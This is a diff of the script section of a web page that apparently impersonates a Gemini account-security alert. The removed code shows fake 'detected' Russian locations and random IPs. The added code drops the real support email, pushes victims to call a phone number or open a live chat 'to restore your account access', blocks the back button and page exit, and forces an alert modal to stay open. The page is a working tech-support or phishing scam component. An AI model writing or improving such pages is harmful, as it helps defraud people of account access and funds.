-        ];
-
-        function getRandomLocation() {
-            return russianLocations[Math.floor(Math.random() * russianLocations.length)];
-        }
-
-        // Get current time
-        function getCurrentTime() {
-            const now = new Date();
-            return now.toLocaleString('en-US', {
-                year: 'numeric',
-                month: 'short',
-                day: 'numeric',
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit',
-                hour12: true
-            });
-        }
-
-        // Initialize page with random data
-        function initializePage() {
-            document.getElementById('detectedLocation').textContent = getRandomLocation();
-            document.getElementById('detectedIP').textContent = generateRandomIP();
-            document.getElementById('detectedTime').textContent = getCurrentTime();
-        }
-
-        // Call support
-        function initiateCall() {
+        function initiateCallModal() {
             const phone = '+18882465357';
-            // Create tel link (works on mobile devices)
             window.location.href = 'tel:' + phone;
             
-            // Fallback: Show alert on non-mobile
             if (!navigator.userAgent.match(/Android|iPhone|iPad|iPod/i)) {
-                alert('Call Support: +1 (888) 246-5357\n\nPlease contact this number to restore your account access.');
+                alert('📞 Call Support: +1 (888) 246-5357\n\nPlease contact this number to restore your account access.');
             }
         }
 
-        // Email support
-        function initiateEmail() {
-            const email = 'security@gemini.com';
-            const subject = 'Account Disabled - Security Review Request';
-            const body = 'Hello,\n\nI need to restore access to my disabled Gemini account.\n\nPlease contact me as soon as possible.\n\nThank you.';
-            
-            window.location.href = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+        function initiateChatModal() {
+            // Load Tawk.to widget
+            if (window.Tawk_API) {
+                window.Tawk_API.toggle();
+            } else {
+                // Initialize Tawk.to if not already loaded
+                var s1 = document.createElement("script");
+                s1.async = true;
+                s1.src = 'https://embed.tawk.to/[YOUR_TAWK_ID]/1hcjfvog4';
+                s1.charset = 'UTF-8';
+                s1.setAttribute('crossorigin', '*');
+                document.head.appendChild(s1);
+            }
         }
 
+        function initiateCall() {
+            const phone = '+18882465357';
+            window.location.href = 'tel:' + phone;
+            
+            if (!navigator.userAgent.match(/Android|iPhone|iPad|iPod/i)) {
+                alert('📞 Call Support: +1 (888) 246-5357\n\nPlease contact this number to restore your account access.');
+            }
+        }
+
+        function initiateChat() {
+            // Load Tawk.to widget
+            if (window.Tawk_API) {
+                window.Tawk_API.toggle();
+            } else {
+                // Initialize Tawk.to if not already loaded
+                var s1 = document.createElement("script");
+                s1.async = true;
+                s1.src = 'https://embed.tawk.to/[YOUR_TAWK_ID]/1hcjfvog4';
+                s1.charset = 'UTF-8';
+                s1.setAttribute('crossorigin', '*');
+                document.head.appendChild(s1);
+            }
+        }
+
+        // Prevent back button
+        window.addEventListener('popstate', function(event) {
+            window.history.forward();
+        });
+
+        // Prevent accidental navigation
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
+        });
+
         // Initialize on page load
-        window.addEventListener('DOMContentLoaded', initializePage);
+        window.addEventListener('DOMContentLoaded', function() {
+            // Initialize Tawk.to on page load
+            var s1 = document.createElement("script");
+            s1.async = true;
+            s1.src = 'https://embed.tawk.to/[YOUR_TAWK_ID]/1hcjfvog4';
+            s1.charset = 'UTF-8';
+            s1.setAttribute('crossorigin', '*');
+            document.head.appendChild(s1);
+
+            // Keep modal visible
+            const modal = document.getElementById('alertModal');
+            if (modal) {
+                modal.style.display = 'flex';
+            }
+        });
     </script>
 </body>
 </html>
